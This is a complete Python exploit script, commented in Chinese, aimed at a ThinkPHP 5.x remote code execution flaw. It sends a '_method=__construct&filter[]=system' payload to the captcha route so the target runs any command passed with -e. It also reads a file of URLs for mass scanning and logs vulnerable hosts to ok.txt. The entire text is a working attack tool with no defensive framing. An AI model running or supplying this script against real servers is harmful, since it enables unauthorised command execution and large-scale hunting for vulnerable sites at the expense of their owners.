import requests
import argparse 
import re
import urllib3
import subprocess





# 禁用警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#requests库的使用
headers = {
           "User-Agent":"Mozilla/6666.0 (Windows NT 7.0; Win32; x32; rv:107.0) Gecko/20100101 Firefox/107.0",
           "Content-Type":"application/x-www-form-urlencoded"
    }

#argparse库的使用

zhushi = argparse.ArgumentParser(description="操作说明",formatter_class=argparse.RawTextHelpFormatter,epilog='''
python .\Thinkphp5.x.py -u http://xxxxx/ -e pwd  (将需要执行命令的命令放在-e后面)
python .\Thinkphp5.x.py -u https://xxxxx/  (url中需要加上http://或https://)
python .\Thinkphp5.x.py -f url.txt (-f后面是txt文本路径)''')

zhushi.add_argument('-u','--url',type=str,help="url地址")
zhushi.add_argument('-e','--exp',type=str,default= "echo+success123;",help="执行的命令")
zhushi.add_argument('-f','--file',type=str,help="文件绝对路径")

jiexi = zhushi.parse_args()

rce = jiexi.exp
print("执行命令    "+rce)
shuju = r"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=" + rce  

if jiexi.url:
        uuu = jiexi.url + "/index.php?s=captcha"
        post = requests.post(url=uuu,verify=False,headers=headers,data=shuju,timeout=3)
        xiangying = str(post.text)
        #验证是否存在success123回显
        if  'success123' in xiangying:     
            print(jiexi.url + ' 存在漏洞')
        else:
            print(jiexi.url + '  漏洞不存在')
            

if jiexi.file:
    file = jiexi.file
    file_1 = open(file)
    wj = file_1.readlines()
    for i in range(len(wj)):
        try:
            aa = (wj[i]).strip()
            aa = aa + "/index.php?s=captcha"
            post = requests.post(url=aa,verify=False,headers=headers,data=shuju,timeout=3)
            xiangying = str(post.text)
            #验证是否存在success123回显
            if  'success123' in xiangying: 
                print((wj[i]).strip() + ' 存在漏洞')
                ok = open('./ok.txt','a+')
                ok.writelines((wj[i]).strip() + '\n')
                ok.close()
            else:
                print(aa + '  漏洞不存在')
        except:
            print((wj[i]).strip() + '  无法访问')
